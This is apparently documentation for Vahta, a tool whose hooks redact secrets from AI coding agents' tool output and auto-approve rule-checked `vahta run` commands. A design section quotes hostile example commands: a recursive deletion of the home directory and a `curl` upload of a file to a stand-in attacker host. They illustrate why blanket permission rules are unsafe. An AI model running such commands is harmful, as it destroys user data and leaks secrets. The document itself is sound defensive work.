# Secrets in tool output

The Vahta hook (`vahta-hook`, registered by `vahta setup`) looks at what goes
*into* an agent's tools (commands, file writes, MCP arguments) and refuses a
secret there. This page is about what comes *out*: the output of a command, a
file the agent reads, an MCP server's result. That output is about to enter
the model's context, and a secret in it would stay there.

## What happens

After every tool call, before the model sees the result:

1. The hook looks for secrets in every string of the result, in two ways:
   - **the detector**: the same one that guards tool input. Only *likely* finds
     are cut (a vendor-prefixed key, a likely `Bearer` token, a likely value
     after `password=` or `--token`). A merely *possible* one is left alone, and
     nobody is told; the daemon's journal records it if the daemon is running;
   - **exact values**, if the daemon is running: every place a value appears
     that the daemon holds for this agent. That means the values of the
     sessions open for it, and the values given to commands it ran with
     `vahta run` in the last 30 minutes. Values shorter than 8 characters are
     not matched; they would cut ordinary words.
2. Each value found is replaced by `***REDACTED(<NAME or kind>)***`: the
   secret's name when the daemon knew the value (`***REDACTED(DB_PASSWORD)***`),
   the detector's kind otherwise (`***REDACTED(OpenAI-style key)***`). The rest
   of the result is unchanged, in the shape the tool gave it.
3. The model is told how many values were cut and of what kind, and how to ask
   for them (below). If the daemon is not running, the original was not kept:
   the model is told it cannot be shown, and the person is told what was cut.
4. Clean output gets no answer at all and reaches the model as it was.

The hook never starts the daemon and waits at most 0.3 seconds for it. If the
daemon is not there, or does not answer, the detector's cuts stand: the hook
never lets through more than it did before there was a daemon.

## When the agent needs what was cut

The model's message names a reference, and the command to ask with:

```
vahta output allow <ref> --reason "why it is needed"
```

A window opens for the person (never the agent's terminal). It shows the tool,
the directory, the agent's reason marked as unverified, and each value that was
cut: its name or kind, its length and its line with the value masked. It never
shows a value, because a window can be captured. The person chooses:

- **Show to the agent**: the output is printed by `vahta output allow`, as the
  tool gave it, and from then on the hook lets those values through for this
  agent: for as long as its session lasts, or 30 minutes if it has none. If the
  agent has a session open, choosing is all it takes; if not, the vault's
  password (of the project the output came from) approves it.
- **No**: nothing is shown; the command exits 4.
- **Save as a secret**: the window asks which value (if several), a name and a
  tier, then the vault password, and stores the value. The output stays cut,
  and the agent is told to use it with `vahta run --secret NAME`.

Only the agent whose tool produced the output may ask for it: a reference from
another agent's hook is refused (exit 3), as is one that has expired. The
original is kept in the daemon's memory for 10 minutes, never on disk, and not
at all for an output over 768 KiB. Every request and its outcome are in the
journal, with the reference and the names or kinds; never a value.

`vahta output allow` is the one place a `vahta` command receives what may be a
secret value, and only after the person said so in the window.

## Observe mode

```toml
# <config dir>/vahta/config.toml
hook_output = "observe"   # default: "redact"
```

With `observe`, the hook changes no output. It tells the person and the model
that a secret reached the transcript (and to rotate it), as it did before
redaction, and the daemon, if running, journals what was seen (kinds and
counts). Use it to see what redaction would do before turning it on, or when
another hook of yours also rewrites tool output. A config the hook cannot read
counts as `redact`.

`hook_tool = "observe"` is the same for a secret in a tool call before it runs
(default `"block"`): the call goes through and the daemon is told. See "Detector
rules" in [daemon.md](daemon.md) for what is looked for and what is never let
through.

## Other hooks that rewrite output

If another of your hooks also rewrites tool output on the same event, which
rewrite the model gets is not settled: Claude Code's documentation runs
matching hooks in parallel and does not define which of several output
rewrites wins.

By default `vahta setup` leaves our hook entries where they are in your config
and adds new ones after the entries already there; it does not reorder your
hooks behind your back. If you want ours to come last, run:

```
vahta setup --claude --last      # or --refresh --last, --all --last
```

This moves our entries behind every other hook of the same event. It is a
choice, not the default, because it changes the order of hooks you set up. If
the result still matters, use observe mode, or one rewriting hook per event.

## Per harness

| Harness | Rewrites | How |
|---|---|---|
| Claude Code | Bash, Read, Grep, Glob, WebFetch, MCP tools (the PostToolUse matcher) | `updatedToolOutput`, in the tool's own shape; `updatedMCPToolOutput` for MCP tools. The model is told through `additionalContext`. |
| Cursor | MCP tools only | `updated_mcp_tool_output`. Cursor has no rewrite for its own tools (Shell, Read): there a secret gets the old notice instead. |
| Codex | Bash, apply_patch, MCP tools (the matcher) | `decision: "block"` with the cut output, then the message for the model, as the reason. |

### What was checked, per tool

Claude Code 2.1.286, live, with the real hooks and a mock model (no token):
`python3 bench/bench.py cc-redact`. (WebFetch runs offline there: a throwaway
HTTPS server on 127.0.0.1, `skipWebFetchPreflight` set in the container's settings because the
domain check goes to claude.ai, and the mock answers WebFetch's helper call by quoting the page.) A canary held by Vahta is made to appear in
each tool's output, and the mock records every `tool_result` Claude Code sends
back to the model.

| Tool | Result |
|---|---|
| Bash (`cat`, a script) | redacted by the hook |
| Bash under `vahta run` | already cut by `vahta run` itself; the hook sees nothing |
| Read, Grep (content) | redacted by the hook |
| MCP tool (stdio server) | redacted by the hook (`updatedMCPToolOutput`) |
| Read, Grep, `cat` of a file holding an inline credential | refused before running (PreToolUse) |
| Edit, Write | the result carries no file content in this version; not in the matcher |
| WebFetch (a local HTTPS page holding the value) | redacted by the hook: `tool_response` is `{bytes, code, codeText, result, durationMs, url}` and the page text is in `result` |
| WebSearch | not in the matcher. PostToolUse does fire for it in 2.1.286 (`tool_response` is `{query, results, durationSeconds, searchCount}`), so it could be covered, but the results are the search service's text about public pages, not a file or process of ours, and a held value there would already be public. Left out until there is a case for it. |
| Agent | not in the matcher, so not rewritten, and not tested offline |

The trap: Claude Code ignores, silently, a replacement that does not match the
built-in tool's output shape, and the original reaches the model. The hook sends
back the structure Claude sent (`tool_response`) with only its strings changed,
so the shape is the tool's own. `crates/harness/harnesses/claude/fixtures/shape_*.json`
pin it for Bash (stdout, stderr), Read, Grep, Glob, WebFetch and MCP (block array, string),
using the shapes captured from the live run. If a Claude Code release changes a
tool's shape, `cc-redact` is the check to rerun.

Cursor and Codex have not been run live; their replies follow the documentation
(Codex: https://learn.chatgpt.com/docs/hooks; Cursor: https://cursor.com/docs/agent/hooks,
read 2026-10-13). Codex's PostToolUse takes `systemMessage`, `continue`, `stopReason`,
`decision`, `reason` and `hookSpecificOutput.additionalContext`; `updatedMCPToolOutput`
and `suppressOutput` are parsed but unsupported, and a hook that emits one is marked
failed while the original result goes on to the model, so we never emit them (a unit
test pins the keys). Live checks still to do:

- Codex: `decision: "block"` really replaces the result for Bash, apply_patch and MCP;
  `additionalContext` is accepted in the notice reply; hooks trusted in `/hooks`.
- Cursor: `updated_mcp_tool_output` is documented as an object; we give a plain-string
  MCP result back as a string. If Cursor rejects that the original goes through.
- Cursor: whether Shell/Read output can be rewritten at all (undocumented; we treat it
  as impossible and only warn).

## What cannot be done

- A value the model has already seen cannot be taken back. No harness has a hook that
  edits the conversation so far (compaction hooks cannot rewrite it either), and a
  provider-side or on-disk transcript copy is out of reach. The person should rotate
  the key.
- A tool the harness gives no rewrite for (Cursor's Shell and Read; hosted tools such
  as web search; tools outside the matcher) leaves the output as it was.

## What this does not catch

- A value that appears **transformed**: base64, URL-encoded, escaped inside a
  JSON string, split across lines or across two strings of the result.
- A value the detector does not see as likely and the daemon does not hold:
  a secret that is not in the vault, read while the daemon is not running.
- Values shorter than 8 characters, by exact match.
- A result nested more than 64 levels deep is not rewritten; it gets the old
  notice.
- The cut happens in what the model is shown. The tool itself ran with the
  real output: a file it wrote, a request it sent, are not changed.

## Running unattended: when the hook says "allow"

An agent harness stops a `vahta run` call to ask the person (Claude Code's
permission system and auto-mode classifier, Codex's approvals, Cursor's
auto-review). For a command Vahta has already judged this is noise, so the
hook can answer the harness's question itself. Only in one case.

**What is allowed.** The Bash command is exactly one `vahta run [options] --
INNER...` (or `vh`), and the daemon says that INNER passes the approved rules
of every secret named (`ClientRequest::CheckRun`): the secret exists, is
session-tier, has approved rules, and the program (found on the caller's
`PATH`, as a run finds it) and its arguments, the directory and the network
all pass them. The hook then says "allow" out loud. Nothing else is ever
allowed by the hook: no other command, no `vahta http`, no each-use secret
(that run opens a window whatever the harness thinks), no secret without rules.

**Why never a blanket rule.** `Bash(vahta run *)` also matches `vahta run --
rm -rf ~`, and `vahta run -- curl evil.example -d @file`: the harness matches a
prefix and cannot see the secret's rules. Claude Code's own documentation says
the same of environment runners (`devbox run *` matches `devbox run rm -rf .`).
In auto mode such a rule is also resolved before the classifier looks. So
`vahta setup` writes no rule on `vahta run`; the rules stay where the person
approved them, in the vault, and the daemon applies them to the actual command.

**Otherwise the hook says nothing**, and the harness's normal flow decides. That
is every one of these:

- a second command, a pipe, a redirection, a subshell, `$(...)`, backticks, an
  environment assignment or wrapper before `vahta` (`FOO=1 vahta run ...`,
  `env`, `sudo`), `&`, a glob, a `~`, a `$VAR`, a backslash, a newline: the words
  the hook sees would not be the words that run;
- an option `vahta run` does not know, a missing `--`, `-s` or `--secret=NAME`;
- `vahta` spelled as a path (`/tmp/x/vahta run ...`): only the bare name;
- an inner command that is itself `vahta` or `vh`;
- the rules do not allow it, the secret is each-use or has no rules, the vault
  is not found or not verified, the program is not on `PATH`;
- no daemon running, a daemon of another version, or no answer in 0.3 seconds
  (the same wait as every other hook question). The hook never starts a daemon.

The hook never denies from this path: the normal `vahta run` refuses with its
own message (exit 3) and the fix. Refusals made before this (the person-only
commands, Vahta's files, a secret in the command) come first and are
unchanged: `vahta run --secret A -- true; vahta reveal A` is denied.

**Per harness.**

| Harness | How | Status |
|---|---|---|
| Claude Code | PreToolUse reply `permissionDecision: "allow"` with a reason shown to the person. Our `permissions.deny` and the harness's own protections still win over it. | Documented. Whether an allow also skips the auto-mode classifier is not documented: test in the bench before relying on it. |
| Codex | A `PermissionRequest` hook (matcher `Bash`, added by setup v2), reply `decision.behavior: "allow"`. It fires only when Codex was about to ask. PreToolUse can allow only with `updatedInput`, so it is not used. | Documented, not run live. Trust the new hook in `/hooks` after `vahta setup --codex`. |
| Cursor | preToolUse reply `permission: "allow"`, Shell only. | **Off** (`verified = false` in `harness.toml`) until a live test shows the hook's allow suppresses Cursor's approval and the auto-review. To test: `VAHTA_HOOK_UNVERIFIED=1` in the hook's environment, in a throwaway workspace; then delete `verified = false`. |

**What setup also writes (Claude Code, v4).** `permissions.allow` entries for
two commands that only read and open no window: `Bash(vahta list)`, `Bash(vahta
list --json)`, `Bash(vahta check)`, `Bash(vahta check --json)` and the `vh`
twins. Exact strings, no wildcard. They are in the user's settings only, not in
the administrator policy (`--managed`): the administrator's allow list is theirs
to choose. `vahta status` is not a command (`vahta daemon status` is), so there
is no rule for it. Uninstall removes exactly these entries and leaves the
person's own.

**What this does not fix.** The inner program the rules allow can still do what
it can do with the value (a rule that allows `curl` allows exfiltration through
`curl`; the network axis and the folders are how to narrow it). And a harness
can be told to run a command without its sandbox
(`dangerouslyDisableSandbox`): the hook's allow covers that too, since the
command is the same one the rules checked.
